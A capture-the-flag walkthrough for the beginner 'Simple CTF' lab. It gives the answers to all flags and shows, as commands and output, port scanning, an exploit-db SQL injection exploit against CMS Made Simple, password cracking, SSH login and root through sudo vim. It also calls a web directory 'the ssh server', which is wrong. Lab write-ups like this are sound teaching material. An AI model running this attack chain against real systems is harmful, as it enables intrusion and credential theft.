# Simple CTF

## Information

**Tags**: Security, Enumeration, Privesc  
**Description**: Beginner level ctf  
**Difficulty**: Easy  
**Author**: MrSeth6797

## Task

Deploy the machine and attempt the questions!

## Flags

1. How many services are running under port 1000?
   - 2
2. What is running on the higher port?
   - ssh
3. What's the CVE you're using against the application?
   - CVE-2019-9053
4. To what kind of vulnerability is the application vulnerable?
   - sqli
5. What's the password?
   - secret
6. Where can you login with the details obtained?
   - ssh
7. What's the user flag?
   - G00d j0b, keep up!
8. Is there any other user in the home directory? What's its name?
   - sunbath
9. What can you leverage to spawn a privileged shell?
   - vim
10. What's the root flag?
    - W3ll d0n3. You made it!

## Solution

First things first, this exercise is an introductory to webhacking and CTF, so it's pretty straightforward.  
The first question is "How many services are running under port 1000?", to find this value we just need to map the open ports. We can do so using an nmap.

```sh
$ nmap -A $ip
```

Doing this we'll get the following result:

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
|_ftp-bounce: bounce working!
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.6.3.44
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Now we know that there are three open ports, the 21, the 80 and the 2222, so **the amount of services running under port 1000 is 2**, answering the first question as well as the second question. **The higher port is 2222, and there is an ssh running in it**.

The next step is finding out where is this ssh server, we can use any dirbuster, personally I prefer gobuster so I'll be using it

```sh
$ gobuster dir -u $ip -w $path_to_wordlist
```

The result should look like this:

```sh
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     $ip
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                $path_to_wordlist
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/19 11:52:20 Starting gobuster in directory enumeration mode
===============================================================
/simple               (Status: 301) [Size: 313] [--> $ip/simple/]

===============================================================
2022/10/19 12:26:20 Finished
===============================================================
```

Now we know that the ssh server is located at **$ip/simple**, now we need to access the website and extract information from it somehow, we can use a chrome extension called [Wappalyzer](https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg) but in this case we just need to read what is in the webpage. There's a copyright section indicating the usage of **CMS Made Simple version 2.2.8**.

Now we can start looking for exploits, after a quick search I found one exploit that fills all our needs: [CMS Made Simple < 2.2.10 - SQL Injection](https://www.exploit-db.com/exploits/46635). This give us the third and fourth questions' answers, **CVE-2019-9053** and **SQLInjection**, or **sqli** for short.

We just need to download, add the .py extension and run it.

```sh
$ wget https://www.exploit-db.com/raw/46635
$ mv 46635 46635.py
$ python2 46635.py
```

Running the code we get the following message telling us information on how to use it:

```sh
[+] Specify an url target
[+] Example usage (no cracking password): exploit.py -u http://target-uri
[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.
```

So now we run:

```sh
$ python2 46635.py -u $ip/simple --crack -w $path_to_wordlist
```

With this command, the code starts running looking for users and passwords on the CMS service, after it finishes we get a result.

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

There we have it, the credentials of mitch, an user of the attacked service. Answering the fifth of our questions, the password is **secret**.

The next step answers the sixth question, **we can login via ssh with using the cracked credentials**.

```sh
$ ssh mitch@$ip -p 2222
secret
```

After we're in, let's check who we are and what super user permissions we have access to.

```sh
$ whoami
mitch
```

```sh
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

We are indeed mitch and have vim sudo privileges. Let's start looking for information, first things first let's check the home folder.

```sh
$ ls
user.txt

$ cat user.txt
G00d j0b, keep up!

$ cd ..

$ ls
mitch  sunbath
```

We got the flag **G00d j0b, keep up!**, the seventh answer in the home folder and transitioning to higher folders we got the eight answer, the name of the other user in the home directory is **sunbath**.

And last but not least, we will **use vim to leverage our privileges and spawn a privileged shell**, answering the ninth question. To do so we just need to open vim with sudo, and use !sh to access the shell without exiting vim.

```sh
$ sudo vim
$ !sh
```

Now what's left is to navigate through the folder looking for sensitive information, in this case there is a flag in the root user folder. The answer of the final question.

```sh
$ whoami
root

$ cd ..
$ cd root
$ cat root.txt
W3ll d0n3. You made it!
```
